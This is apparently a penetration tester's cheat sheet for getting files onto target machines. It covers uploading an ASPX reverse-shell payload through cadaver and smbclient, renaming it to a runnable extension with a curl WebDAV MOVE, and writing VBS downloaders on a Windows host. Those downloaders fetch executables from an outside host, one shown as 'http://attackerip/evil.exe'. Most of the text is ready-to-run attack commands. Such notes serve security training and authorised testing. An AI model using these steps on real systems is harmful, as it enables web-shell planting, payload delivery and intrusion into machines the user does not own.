# File Transfer


## HTTP Server

> python -m SimpleHTTPServer 8000

> python3 -m http.server 8000


## SMB File Upload

**Method 1: Cadaver**

```
cadaver http://10.11.1.13/scripts/
put /root/Desktop/shellLER/phpReverseShell/aspunstage.aspx
```

**Method 2: Smbclient**

```
$ smbclient //server/share -c 'cd c:/remote/path ; put local-file'
```
Second example
```
smbclient -W ENGR_STUDENT -U EngrID //hnas.engr.uconn.edu/EngrGroupMixed
get <somethingRecieve>.tgz
put <somethingSend>.tgz
```

**Method 3: CURL**

Change file name with MOVE method. aspx -> asp

```
curl -X MOVE --header    "Destination:http://10.11.1.13/scripts/aspunstaged.asp" "http://10.11.1.13/scripts/aspunstaged.aspx"
```

## VBS Script

### Script 1 Code:

```
 echo Set args = Wscript.Arguments  >> webdl.vbs
 timeout 1
 echo Url = "http://1.1.1.1/windows-privesc-check2.exe"  >> webdl.vbs
 timeout 1
 echo dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")  >> webdl.vbs
 timeout 1
 echo dim bStrm: Set bStrm = createobject("Adodb.Stream")  >> webdl.vbs
 timeout 1
 echo xHttp.Open "GET", Url, False  >> webdl.vbs
 timeout 1
 echo xHttp.Send  >> webdl.vbs
 timeout 1
 echo with bStrm      >> webdl.vbs
 timeout 1
 echo 	.type = 1 '      >> webdl.vbs
 timeout 1
 echo 	.open      >> webdl.vbs
 timeout 1
 echo 	.write xHttp.responseBody      >> webdl.vbs
 timeout 1
 echo 	.savetofile "C:\temp\windows-privesc-check2.exe", 2 '  >> webdl.vbs
 timeout 1
 echo end with >> webdl.vbs
 timeout 1
 echo
```

File can be run using following syntax

```
C:\temp\cscript.exe webdl.vbs
```

### Script 2 Code:
```
echo strUrl = WScript.Arguments.Item(0) > wget.vbs
echo StrFile = WScript.Arguments.Item(1) >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DEFAULT = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PRECONFIG = 0 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_DIRECT = 1 >> wget.vbs
echo Const HTTPREQUEST_PROXYSETTING_PROXY = 2 >> wget.vbs
echo Dim http, varByteArray, strData, strBuffer, lngCounter, fs, ts >> wget.vbs
echo Err.Clear >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set http = CreateObject("WinHttp.WinHttpRequest.5.1") >> wget.vbs
echo If http Is Nothing Then Set http = CreateObject("WinHttp.WinHttpRequest") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("MSXML2.ServerXMLHTTP") >> wget.vbs 
echo If http Is Nothing Then Set http = CreateObject("Microsoft.XMLHTTP") >> wget.vbs
echo http.Open "GET", strURL, False >> wget.vbs
echo http.Send >> wget.vbs
echo varByteArray = http.ResponseBody >> wget.vbs
echo Set http = Nothing >> wget.vbs
echo Set fs = CreateObject("Scripting.FileSystemObject") >> wget.vbs
echo Set ts = fs.CreateTextFile(StrFile, True) >> wget.vbs
echo strData = "" >> wget.vbs
echo strBuffer = "" >> wget.vbs
echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs
echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs
echo Next >> wget.vbs
echo ts.Close >> wget.vbs
```

to start:

```
cscript wget.vbs http://attackerip/evil.exe evil.exe
```


